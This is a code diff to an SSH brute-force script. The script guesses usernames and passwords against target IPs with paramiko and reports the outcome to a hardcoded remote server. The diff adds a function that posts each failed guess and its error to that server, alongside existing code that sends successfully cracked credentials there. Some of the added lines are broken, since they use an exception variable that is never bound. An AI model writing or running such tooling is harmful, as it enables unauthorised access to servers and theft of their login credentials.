@@ -46,6 +46,13 @@ def send_result_to_server(target_ip, success, username="", password=""):
     response = requests.post(url, json=data, headers=headers)
     return response
 
+def send_error_to_server(target_ip, username, guess, error):
+    url = "http://65.108.222.76:5000/error"
+    data = {"target_ip": target_ip, "username": username,
+            "guess": guess, "error": error}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(url, json=data, headers=headers)
+    return response
 
 def send_timeout_to_server(target_ip):
     url = "http://65.108.222.76:5000/timeout"
@@ -93,6 +100,7 @@ def ssh_login(server_ip, username, password):
     except paramiko.BadAuthenticationType as e:
         print({"ip": server_ip, "username": username,
               "guess": password, "error": str(e)})
+        send_error_to_server(server_ip, username, password, str(e))
         if "Invalid user" in str(e):
             return 5  # User doesn't exist
         if "Bad authentication type; allowed types: ['publickey']" in str(e):
@@ -100,8 +108,12 @@ def ssh_login(server_ip, username, password):
         else:
             return 0  # Other BadAuthenticationType exception occurred
     except paramiko.AuthenticationException:
+        send_error_to_server(server_ip, username, password, str(e))
+
         return 3  # Wrong password
     except paramiko.SSHException as e:
+        send_error_to_server(server_ip, username, password, str(e))
+
         print({"ip": server_ip, "username": username,
               "guess": password, "error": str(e)})
         if "not open" in str(e):
@@ -114,6 +126,8 @@ def ssh_login(server_ip, username, password):
             return 0  # Other SSHException occurred
 
     except Exception as e:
+        send_error_to_server(server_ip, username, password, str(e))
+
         print({"ip": server_ip, "username": username,
               "guess": password, "error": str(e)})
 
@@ -128,13 +142,11 @@ def brute(server_ip, guess, times=0):
 
     if result == 1:
         creds = {"password": guess, "username": USERS[times]}
-        CREDS[server_ip] = creds
         send_result_to_server(server_ip, True, USERS[times], guess)
         return 0
 
     if result == 2:
         if times == 2:
-            NOT_PASSWORD.append(server_ip)
             send_result_to_server(server_ip, False)
             return 0
         else:
